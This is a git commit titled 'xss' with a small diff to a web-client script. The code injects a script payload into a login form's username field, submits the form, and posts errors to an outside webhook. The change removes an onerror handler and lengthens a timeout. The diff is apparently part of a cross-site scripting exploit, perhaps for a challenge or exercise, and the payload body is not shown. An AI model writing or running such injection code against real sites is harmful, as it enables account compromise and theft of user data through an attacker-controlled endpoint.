b168c98c9142a4588bb6e1ce510669459de93ad0
Timothy Didierjean <timothy.didierjean@epita.fr>
2025-05-28 20:47:11 +0200

    xss

--- web-client/index.js
+++ web-client/index.js
@@ -45,10 +45,9 @@ try {
 }
 `;
   document.getElementById("username").value = `<script>${payload}</script>`;
-  document.getElementById("imgwait").onerror = "imgEnd()";
   document.getElementById("login").submit();
 
-  setTimeout(() => imgEnd(), 3000);
+  setTimeout(() => imgEnd(), 4000);
 } catch (error) {
   post(WEBHOOK, `Error: ${error}`);
 }
